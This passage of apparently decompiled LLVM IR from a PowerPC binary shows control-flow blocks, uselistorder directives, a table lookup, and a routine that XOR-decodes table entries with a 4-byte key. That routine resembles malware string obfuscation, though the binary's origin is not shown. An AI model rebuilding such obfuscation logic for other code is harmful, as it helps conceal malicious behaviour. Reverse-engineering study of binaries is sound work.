dec_label_pc_1000a094:                            ; preds = %dec_label_pc_1000a0ac, %dec_label_pc_1000a09c
  %v4_1000a0b014 = phi i1 [ %v4_1000a0b0, %dec_label_pc_1000a0ac ], [ %v4_1000a0a4, %dec_label_pc_1000a09c ]
  %v2_1000a0b012 = phi i1 [ %v2_1000a0b0, %dec_label_pc_1000a0ac ], [ %v2_1000a0a4, %dec_label_pc_1000a09c ]
  %v1_1000a094 = add i32 %v0_1000a094, 16
  store i32 %v1_1000a094, i32* %r0.global-to-local, align 4
  %v1_1000a098 = add i32 %v0_1000a098, -1
  store i32 %v1_1000a098, i32* %ctr.global-to-local, align 4
  %v2_1000a098 = icmp eq i32 %v1_1000a098, 0
  br i1 %v2_1000a098, label %dec_label_pc_1000a1d0.loopexit, label %dec_label_pc_1000a09c

dec_label_pc_1000a09c:                            ; preds = %dec_label_pc_1000a094, %dec_label_pc_1000a084
  %v0_1000a098 = phi i32 [ %v1_1000a098, %dec_label_pc_1000a094 ], [ %v3_1000a068, %dec_label_pc_1000a084 ]
  %v0_1000a094 = phi i32 [ %v1_1000a094, %dec_label_pc_1000a094 ], [ %v3_1000a08c, %dec_label_pc_1000a084 ]
  store i32 %v0_1000a094, i32* %r9.global-to-local, align 4
  %v1_1000a0a0 = add i32 %v0_1000a094, 8
  %v2_1000a0a0 = inttoptr i32 %v1_1000a0a0 to i16*
  %v3_1000a0a0 = load i16, i16* %v2_1000a0a0, align 2
  %v4_1000a0a0 = zext i16 %v3_1000a0a0 to i32
  store i32 %v4_1000a0a0, i32* %r0.global-to-local, align 4
  %v2_1000a0a4 = icmp ult i32 %v4_1000a0a0, %v2_1000a06c
  %v3_1000a0a4 = icmp ugt i32 %v4_1000a0a0, %v2_1000a06c
  %v4_1000a0a4 = icmp eq i32 %v4_1000a0a0, %v2_1000a06c
  br i1 %v3_1000a0a4, label %dec_label_pc_1000a094, label %dec_label_pc_1000a0ac

dec_label_pc_1000a0ac:                            ; preds = %dec_label_pc_1000a09c
  %v1_1000a0ac = add i32 %v0_1000a094, 10
  %v2_1000a0ac = inttoptr i32 %v1_1000a0ac to i16*
  %v3_1000a0ac = load i16, i16* %v2_1000a0ac, align 2
  %v4_1000a0ac = zext i16 %v3_1000a0ac to i32
  store i32 %v4_1000a0ac, i32* %r0.global-to-local, align 4
  %v2_1000a0b0 = icmp ult i32 %v4_1000a0ac, %v2_1000a06c
  %v3_1000a0b0 = icmp ugt i32 %v4_1000a0ac, %v2_1000a06c
  %v4_1000a0b0 = icmp eq i32 %v4_1000a0ac, %v2_1000a06c
  br i1 %v3_1000a0b0, label %dec_label_pc_1000a0b8.loopexit, label %dec_label_pc_1000a094

dec_label_pc_1000a0b8.loopexit:                   ; preds = %dec_label_pc_1000a0ac
  store i1 %v2_1000a0b0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a0b0, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000a0b8

dec_label_pc_1000a0b8:                            ; preds = %dec_label_pc_1000a0b8.loopexit, %dec_label_pc_1000a1d0
  %v0_1000a0c0 = phi i32 [ %v0_1000a094, %dec_label_pc_1000a0b8.loopexit ], [ 0, %dec_label_pc_1000a1d0 ]
  %v0_1000a0b8 = load i32, i32* @r28, align 4
  %v1_1000a0b8 = add i32 %v0_1000a0b8, 4
  %v2_1000a0b8 = inttoptr i32 %v1_1000a0b8 to i32*
  %v3_1000a0b8 = load i32, i32* %v2_1000a0b8, align 4
  store i32 %v3_1000a0b8, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_1000a0c0 = inttoptr i32 %v0_1000a0b8 to i32*
  store i32 %v0_1000a0c0, i32* %v2_1000a0c0, align 4
  %v0_1000a0c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000a0c4 = load i32, i32* @r28, align 4
  %v2_1000a0c4 = add i32 %v1_1000a0c4, 24
  %v3_1000a0c4 = inttoptr i32 %v2_1000a0c4 to i32*
  store i32 %v0_1000a0c4, i32* %v3_1000a0c4, align 4
  %v0_1000946c.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009468

dec_label_pc_1000a0e0:                            ; preds = %dec_label_pc_1000a020
  %v0_1000a0e0 = load i32, i32* @r28, align 4
  %v1_1000a0e0 = add i32 %v0_1000a0e0, 4
  %v2_1000a0e0 = inttoptr i32 %v1_1000a0e0 to i32*
  %v3_1000a0e0 = load i32, i32* %v2_1000a0e0, align 4
  store i32 %v3_1000a0e0, i32* %r3.global-to-local, align 4
  store i32 268476648, i32* @lr, align 4
  %v0_1000a0e4 = call i32 @function_1000b3f0()
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_1000a0f0 = load i32, i32* @r28, align 4
  %v2_1000a0f0 = add i32 %v1_1000a0f0, 4
  %v3_1000a0f0 = inttoptr i32 %v2_1000a0f0 to i32*
  store i32 -1, i32* %v3_1000a0f0, align 4
  %v0_1000a0f4 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000a0f4 = load i32, i32* @r28, align 4
  %v2_1000a0f4 = add i32 %v1_1000a0f4, 12
  %v3_1000a0f4 = inttoptr i32 %v2_1000a0f4 to i32*
  store i32 %v0_1000a0f4, i32* %v3_1000a0f4, align 4
  %v0_1000a0f8 = load i32, i32* %r29.global-to-local, align 4
  %v1_1000a0f8 = trunc i32 %v0_1000a0f8 to i8
  %v2_1000a0f8 = load i32, i32* @r28, align 4
  %v3_1000a0f8 = add i32 %v2_1000a0f8, 284
  %v4_1000a0f8 = inttoptr i32 %v3_1000a0f8 to i8*
  store i8 %v1_1000a0f8, i8* %v4_1000a0f8, align 1
  br label %dec_label_pc_10009410

dec_label_pc_1000a1d0.loopexit:                   ; preds = %dec_label_pc_1000a094
  store i1 %v2_1000a0b012, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_1000a0b014, i1* %cr7_eq.global-to-local, align 1
  br label %dec_label_pc_1000a1d0

dec_label_pc_1000a1d0:                            ; preds = %dec_label_pc_1000a1d0.loopexit, %dec_label_pc_1000a050
  store i32 0, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a0b8

dec_label_pc_1000a200:                            ; preds = %dec_label_pc_10009f0c
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_1000a204 = load i32, i32* %r22.global-to-local, align 4
  %v2_1000a204 = inttoptr i32 %v1_1000a204 to i32*
  store i32 104, i32* %v2_1000a204, align 4
  br label %dec_label_pc_10009f24

dec_label_pc_1000a20c:                            ; preds = %dec_label_pc_1000897c
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_1000a210 = load i32, i32* @global_var_1001eb40.192, align 4
  store i32 %v3_1000a210, i32* %r3.global-to-local, align 4
  store i32 268476952, i32* @lr, align 4
  %v0_1000a214 = call i32 @function_1000b3f0()
  store i32 %v0_1000a214, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100095cc

dec_label_pc_1000a21c:                            ; preds = %dec_label_pc_10009f24
  %v0_1000a21c = load i32, i32* @r28, align 4
  store i32 %v0_1000a21c, i32* @r3, align 4
  store i32 268476964, i32* @lr, align 4
  %v0_1000a220 = call i32 @function_1000856c()
  store i32 %v0_1000a220, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10009410

; uselistorder directives
  uselistorder i32 %v4_1000a0ac, { 2, 1, 0, 3 }
  uselistorder i32 %v4_1000a0a0, { 2, 1, 0, 3 }
  uselistorder i32 %v0_1000a094, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v1_1000a098, { 0, 2, 1 }
  uselistorder i32 %v2_1000a06c, { 3, 2, 1, 6, 5, 4, 0, 7 }
  uselistorder i32 %v3_1000a068, { 1, 2, 0, 4, 3, 5 }
  uselistorder i32 %v1_10009f3c, { 1, 2, 0 }
  uselistorder i32 %v0_10009f3c, { 1, 0 }
  uselistorder i32 %v2_10009f18, { 1, 0, 2 }
  uselistorder i32 %v1_10009658, { 1, 0 }
  uselistorder i32 %v0_10009614, { 4, 3, 2, 5, 6, 7, 0, 1 }
  uselistorder i32 %v0_10009608, { 1, 2, 0 }
  uselistorder i32 %v0_100095f4, { 4, 3, 2, 5, 6, 7, 1, 0 }
  uselistorder i32 %v0_100095e0, { 4, 3, 2, 5, 6, 7, 0, 1 }
  uselistorder i32 %v0_100095d4, { 1, 2, 0 }
  uselistorder i32 %v1_10009518, { 1, 0 }
  uselistorder i32 %v3_10009508, { 0, 3, 2, 1, 4 }
  uselistorder i32 %v0_10009508, { 1, 0 }
  uselistorder i32 %v1_100094f0, { 2, 1, 0 }
  uselistorder i32 %v1_100094ec, { 1, 0 }
  uselistorder i32 %v1_100094e8, { 1, 0 }
  uselistorder i32 %v4_100094c4, { 4, 3, 6, 0, 1, 2, 5, 7 }
  uselistorder i32 %v2_100094b8, { 1, 0, 2 }
  uselistorder i32 %v3_100094b0, { 1, 0 }
  uselistorder i32 %v1_10009498, { 1, 0, 2 }
  uselistorder i32 %v3_10009494, { 1, 0, 2 }
  uselistorder i32 %v3_10009488, { 1, 0, 2 }
  uselistorder i32 %v0_10009f70, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10009480, { 1, 0 }
  uselistorder i32 %v1_10009474, { 1, 0 }
  uselistorder i32 %v1_10009460, { 2, 1, 0 }
  uselistorder i32 %v1_10009454, { 1, 0 }
  uselistorder i32 %v0_10009454, { 1, 0 }
  uselistorder i32 %v3_1000943c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_10009428, { 1, 0 }
  uselistorder i32 %v1_10009414, { 1, 0, 4, 3, 2, 5 }
  uselistorder i32 %v2_1000a034, { 2, 3, 1, 0 }
  uselistorder i32 %v2_1000a030, { 2, 3, 1, 0 }
  uselistorder i32 %v1_100093b0, { 2, 1, 4, 3, 5, 0 }
  uselistorder i32 %v1_10009394, { 1, 2, 0 }
  uselistorder i32 %v1_10009390, { 1, 0 }
  uselistorder i32 %v3_10009378, { 0, 2, 1, 3 }
  uselistorder i32 %v2_10009364, { 2, 1, 0, 3 }
  uselistorder i32 %v1_10009368, { 2, 1, 0 }
  uselistorder i1 %v3_10009354, { 2, 0, 1 }
  uselistorder i1 %v1_10009354, { 1, 0, 2 }
  uselistorder i32 %v3_10009350, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v2_1000934c, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v1_10009324, { 0, 1, 4, 3, 2, 5 }
  uselistorder i32 %v2_10009304, { 1, 0 }
  uselistorder i32 %v3_10009644, { 5, 0, 4, 3, 6, 2, 1, 7 }
  uselistorder i32 %v2_10009648, { 5, 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_100092c4, { 1, 0 }
  uselistorder i32 %v1_100092a4, { 1, 0 }
  uselistorder i32 %v6_1000927c, { 1, 2, 0 }
  uselistorder i32 %v1_10009240, { 1, 0 }
  uselistorder i32 %v3_10009238, { 1, 0, 2 }
  uselistorder i32 %v1_10009234, { 2, 1, 0 }
  uselistorder i32 %v1_10009230, { 1, 0 }
  uselistorder i32 %v0_10009238, { 0, 3, 2, 1 }
  uselistorder i32 %v3_10009218, { 1, 0, 2 }
  uselistorder i32 %v0_100091f8, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_100091a0, { 3, 4, 1, 2, 0 }
  uselistorder i32 %v3_10009180, { 1, 0, 2 }
  uselistorder i32 %v2_10009168, { 1, 0, 2 }
  uselistorder i32 %v0_10009168, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_10009174, { 2, 1, 0 }
  uselistorder i32 %v1_100091dc, { 1, 0 }
  uselistorder i32 %v1_100091d4, { 1, 0 }
  uselistorder i32 %v1_100091cc, { 1, 0 }
  uselistorder i32 %v1_100091ec, { 2, 1, 0 }
  uselistorder i32 %v1_100091c4, { 1, 0 }
  uselistorder i32 %v4_100091b4, { 1, 0, 2 }
  uselistorder i32 %v2_10009144, { 0, 2, 1, 3 }
  uselistorder i32 %v1_10009118, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_100090a4, { 1, 0 }
  uselistorder i32 %v4_10009084, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v1_10008ff4, { 3, 1, 2, 0 }
  uselistorder i32 %v1_10008fa4, { 3, 1, 2, 0 }
  uselistorder i32 %v0_10008f90, { 0, 2, 1, 4, 3, 6, 5, 8, 7, 10, 9, 12, 11, 14, 13, 16, 15, 18, 17, 20, 19, 22, 21, 23, 26, 25, 24, 28, 27, 30, 29, 32, 31, 34, 33, 36, 35, 38, 37, 40, 39, 41, 43, 42, 44, 45 }
  uselistorder i32 %v1_10008f78, { 1, 2, 0 }
  uselistorder i32 %v0_10008f74, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v0_10008f60, { 1, 0 }
  uselistorder i32 %v3_10008f30, { 1, 0, 2 }
  uselistorder i32 %v0_10008d38, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10008d28, { 1, 0, 2, 3 }
  uselistorder i32 %v0_10008a10, { 1, 0 }
  uselistorder i32 %v1_100089d0, { 3, 1, 2, 0 }
  uselistorder i32 %v5_100089c0, { 1, 0, 2 }
  uselistorder i32 %v3_10008964, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_1000894c, { 1, 0 }
  uselistorder i32 %v0_10008948, { 1, 0 }
  uselistorder i32 %v1_10008944, { 1, 0 }
  uselistorder i32 %v0_10008934, { 1, 2, 0 }
  uselistorder i32 %v2_100088f4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_10008858, { 5, 2, 1, 3, 0, 4, 7, 6, 8 }
  uselistorder i64* %stack_var_-1900, { 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0, 2, 1 }
  uselistorder i32* %stack_var_-1892, { 1, 0 }
  uselistorder i32 %tmp64, { 1, 2, 0 }
  uselistorder i8 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp61, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 29, 30, 25, 26, 27, 28, 31, 58, 59, 32, 60, 61, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 55, 52, 53, 54, 56, 57 }
  uselistorder i32* %r6.global-to-local, { 7, 0, 1, 2, 3, 4, 5, 6, 8, 9, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i32* %r4.global-to-local, { 7, 8, 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 62, 61, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83 }
  uselistorder i32* %r3.global-to-local, { 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 25, 26, 27, 28, 29, 30, 32, 31, 34, 33, 35, 36, 37, 23, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 54, 53, 55, 56, 57, 58, 60, 59, 61, 62, 64, 63, 65, 66, 68, 67, 69, 70, 71, 72, 73, 74, 75, 76, 78, 77, 79, 80, 81, 83, 82, 84, 85, 86, 88, 87, 89, 90, 91, 92, 93, 95, 94, 96, 97, 99, 98, 100, 101, 102, 104, 103, 105, 106, 107, 109, 108, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123 }
  uselistorder i32* %r11.global-to-local, { 0, 1, 2, 25, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 29, 14, 30, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 26, 27, 28 }
  uselistorder i32* %r10.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 10, 11, 8, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 38, 15, 16, 17, 18, 20, 19, 21, 22, 23, 24, 26, 25, 27, 28, 29, 30, 35, 36, 37, 31, 32, 33, 34, 39, 41, 40, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74 }
  uselistorder i32* %ctr.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 17, 18, 7, 8, 9, 19, 20, 10, 11, 12, 13, 14, 15, 16 }
  uselistorder i1* %cr7_lt.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 30, 31, 27, 28, 29, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74 }
  uselistorder i1* %cr7_eq.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 31, 32, 28, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76 }
  uselistorder i16* @global_var_1001eb34.188, { 2, 1, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000c024, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000c108, { 16, 15, 14, 13, 12, 11, 10, 9, 4, 3, 2, 1, 8, 7, 6, 5, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @function_1000c090, { 5, 8, 7, 6, 10, 9, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000b6b8, { 1, 2, 3, 0 }
  uselistorder i32 ()* @function_1000856c, { 2, 1, 0 }
  uselistorder i32 2323, { 1, 0 }
  uselistorder i32 39, { 4, 5, 0, 6, 1, 7, 2, 8, 3, 9 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_1000c0c8, { 1, 0, 4, 3, 2 }
  uselistorder i8 6, { 3, 4, 5, 6, 7, 8, 9, 0, 1, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_1000c140, { 2, 9, 8, 7, 0, 6, 5, 4, 3, 1 }
  uselistorder i32 16384, { 10, 40, 9, 41, 8, 42, 7, 43, 0, 44, 1, 45, 2, 46, 3, 59, 4, 60, 5, 61, 6, 62, 11, 31, 34, 35, 33, 36, 37, 38, 32, 12, 47, 13, 48, 49, 50, 14, 16, 15, 18, 17, 19, 51, 20, 52, 22, 53, 21, 24, 54, 23, 25, 55, 56, 26, 57, 58, 39, 27, 28, 29, 30 }
  uselistorder i32 (i32, i32, i32, i32)* @function_10006138, { 2, 9, 8, 7, 0, 6, 5, 4, 3, 1 }
  uselistorder i32 (i32, i32)* @function_100060d4, { 3, 11, 10, 9, 0, 8, 7, 6, 5, 4, 2, 1 }
  uselistorder i32 198, { 1, 0, 2, 3 }
  uselistorder i32 100, { 0, 1, 3, 4, 2 }
  uselistorder i32 172, { 1, 0, 6, 7, 4, 5, 8, 9, 2, 3 }
  uselistorder i32 192, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_1000dfa4.224 to i32), { 1, 0, 2 }
  uselistorder i32 ptrtoint (i8* @global_var_1000df44.212 to i32), { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10008658, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16* @global_var_1001ebe2.202, { 2, 0, 1 }
  uselistorder i8 64, { 13, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 1024, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* @r16, { 1, 2, 3, 0, 4 }
  uselistorder i32 65536, { 1, 0, 2, 75, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 18, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74 }
  uselistorder i32 ()* @function_10007ca8, { 26, 25, 24, 23, 22, 21, 75, 28, 77, 76, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 20, 19, 18, 17, 16, 15, 14, 13, 12, 27, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1000c180, { 1, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 288, { 0, 1, 5, 6, 2, 7, 3, 4, 8 }
  uselistorder i32 ()* @function_1000b7c0, { 6, 5, 4, 13, 12, 11, 10, 9, 8, 7, 3, 0, 2, 1 }
  uselistorder i32 (i32)* @function_10007cf8, { 0, 2, 1 }
  uselistorder i32 (i32)* @function_1000ae68, { 0, 1, 3, 2 }
  uselistorder i32 ()* @function_1000b438, { 2, 4, 3, 1, 0 }
  uselistorder i32* @r24, { 6, 7, 8, 9, 10, 1, 3, 4, 2, 5, 0, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder label %dec_label_pc_1000a0b8, { 1, 0 }
  uselistorder label %dec_label_pc_10009f24, { 1, 0 }
  uselistorder label %dec_label_pc_100095d4, { 1, 0 }
  uselistorder label %dec_label_pc_100095cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_100094f4, { 1, 0 }
  uselistorder label %dec_label_pc_100094ec, { 1, 0 }
  uselistorder label %dec_label_pc_100094a4, { 1, 0 }
  uselistorder label %dec_label_pc_10009488, { 1, 0 }
  uselistorder label %dec_label_pc_10009468, { 1, 0 }
  uselistorder label %dec_label_pc_10009410, { 4, 5, 6, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_100093e0, { 1, 0 }
  uselistorder label %dec_label_pc_1000935c, { 1, 0 }
  uselistorder label %dec_label_pc_10009320, { 3, 4, 0, 2, 5, 1 }
  uselistorder label %dec_label_pc_100092b8.dec_label_pc_100092b8_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009298.dec_label_pc_10009298_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10009288, { 1, 4, 2, 3, 0 }
  uselistorder label %dec_label_pc_10009168, { 1, 0 }
  uselistorder label %dec_label_pc_10009138, { 0, 1, 2, 7, 8, 3, 4, 5, 6, 9, 10 }
  uselistorder label %dec_label_pc_1000912c, { 1, 0 }
  uselistorder label %dec_label_pc_10009058, { 0, 4, 1, 2, 5, 3, 6, 8, 7 }
  uselistorder label %dec_label_pc_10008f74.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_100089cc, { 1, 0 }
}

define i32 @function_1000a238(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_1000a238:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %v3_1000a238 = icmp eq i32* %arg2, null
  %v1_1000a240 = mul i32 %arg1, 8
  store i32 %v1_1000a240, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001ec1c.282 to i32), i32* %r9.global-to-local, align 4
  br i1 %v3_1000a238, label %dec_label_pc_1000a258, label %dec_label_pc_1000a250

dec_label_pc_1000a250:                            ; preds = %dec_label_pc_1000a238
  %v1_1000a250 = add i32 %v1_1000a240, add (i32 ptrtoint (i32* @global_var_1001ec1c.282 to i32), i32 4)
  %v2_1000a250 = inttoptr i32 %v1_1000a250 to i16*
  %v3_1000a250 = load i16, i16* %v2_1000a250, align 4
  %v4_1000a250 = zext i16 %v3_1000a250 to i32
  store i32 %v4_1000a250, i32* %arg2, align 4
  %v0_1000a258.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1000a258.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000a258

dec_label_pc_1000a258:                            ; preds = %dec_label_pc_1000a238, %dec_label_pc_1000a250
  %v1_1000a258 = phi i32 [ ptrtoint (i32* @global_var_1001ec1c.282 to i32), %dec_label_pc_1000a238 ], [ %v1_1000a258.pre, %dec_label_pc_1000a250 ]
  %v0_1000a258 = phi i32 [ %v1_1000a240, %dec_label_pc_1000a238 ], [ %v0_1000a258.pre, %dec_label_pc_1000a250 ]
  %v2_1000a258 = add i32 %v0_1000a258, %v1_1000a258
  %v3_1000a258 = inttoptr i32 %v2_1000a258 to i32*
  %v4_1000a258 = load i32, i32* %v3_1000a258, align 4
  store i32 %v4_1000a258, i32* %r3.global-to-local, align 4
  ret i32 %v4_1000a258

; uselistorder directives
  uselistorder i32 %v1_1000a240, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000a258, { 1, 0 }
}

define i32 @function_1000a260(i32 %arg1) local_unnamed_addr {
dec_label_pc_1000a260:
  %cr7_eq.global-to-local = alloca i1, align 1
  %cr7_lt.global-to-local = alloca i1, align 1
  %r10.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %v1_1000a264 = mul i32 %arg1, 8
  %v2_1000a26c = add i32 %v1_1000a264, ptrtoint (i32* @global_var_1001ec1c.282 to i32)
  %v1_1000a274 = add i32 %v1_1000a264, add (i32 ptrtoint (i32* @global_var_1001ec1c.282 to i32), i32 4)
  %v2_1000a274 = inttoptr i32 %v1_1000a274 to i16*
  %v3_1000a274 = load i16, i16* %v2_1000a274, align 4
  %v3_1000a278 = icmp eq i16 %v3_1000a274, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000a278, i1* %cr7_eq.global-to-local, align 1
  %v3_1000a27c = load i32, i32* @global_var_1001eafc.283, align 4
  %v1_1000a280 = udiv i32 %v3_1000a27c, 16777216
  store i32 %v1_1000a280, i32* @r5, align 4
  %v1_1000a284 = urem i32 %v3_1000a27c, 256
  store i32 %v1_1000a284, i32* %r6.global-to-local, align 4
  %v1_1000a288 = call i32 @__asm_rlwinm(i32 %v3_1000a27c, i32 24, i32 24, i32 31)
  %v1_1000a28c = call i32 @__asm_rlwinm(i32 %v3_1000a27c, i32 16, i32 24, i32 31)
  %v0_1000a290 = load i32, i32* @lr, align 4
  %v1_1000a290 = load i1, i1* %cr7_eq.global-to-local, align 1
  %v2_1000a290 = load i1, i1* %cr7_lt.global-to-local, align 1
  %v3_1000a290 = or i1 %v1_1000a290, %v2_1000a290
  call void @__pseudo_cond_branch(i1 %v3_1000a290, i32 %v0_1000a290)
  store i32 0, i32* %r10.global-to-local, align 4
  %v1_1000a298 = inttoptr i32 %v2_1000a26c to i32*
  br label %dec_label_pc_1000a298

dec_label_pc_1000a298:                            ; preds = %dec_label_pc_1000a298, %dec_label_pc_1000a260
  %v1_1000a2a4 = phi i32 [ %v1_1000a2d8, %dec_label_pc_1000a298 ], [ 0, %dec_label_pc_1000a260 ]
  %v2_1000a298 = load i32, i32* %v1_1000a298, align 4
  %v2_1000a29c = add i32 %v2_1000a298, %v1_1000a2a4
  %v3_1000a29c = inttoptr i32 %v2_1000a29c to i8*
  %v4_1000a29c = load i8, i8* %v3_1000a29c, align 1
  %v5_1000a29c = zext i8 %v4_1000a29c to i32
  %v0_1000a2a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000a2a0 = xor i32 %v0_1000a2a0, %v5_1000a29c
  %v3_1000a2a4 = trunc i32 %v2_1000a2a0 to i8
  store i8 %v3_1000a2a4, i8* %v3_1000a29c, align 1
  %v2_1000a2a8 = load i32, i32* %v1_1000a298, align 4
  %v0_1000a2ac = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a2ac = add i32 %v0_1000a2ac, %v2_1000a2a8
  %v3_1000a2ac = inttoptr i32 %v2_1000a2ac to i8*
  %v4_1000a2ac = load i8, i8* %v3_1000a2ac, align 1
  %v5_1000a2ac = zext i8 %v4_1000a2ac to i32
  %v2_1000a2b0 = xor i32 %v5_1000a2ac, %v1_1000a288
  %v3_1000a2b4 = trunc i32 %v2_1000a2b0 to i8
  store i8 %v3_1000a2b4, i8* %v3_1000a2ac, align 1
  %v2_1000a2b8 = load i32, i32* %v1_1000a298, align 4
  %v0_1000a2bc = load i32, i32* %r10.global-to-local, align 4
  %v2_1000a2bc = add i32 %v0_1000a2bc, %v2_1000a2b8
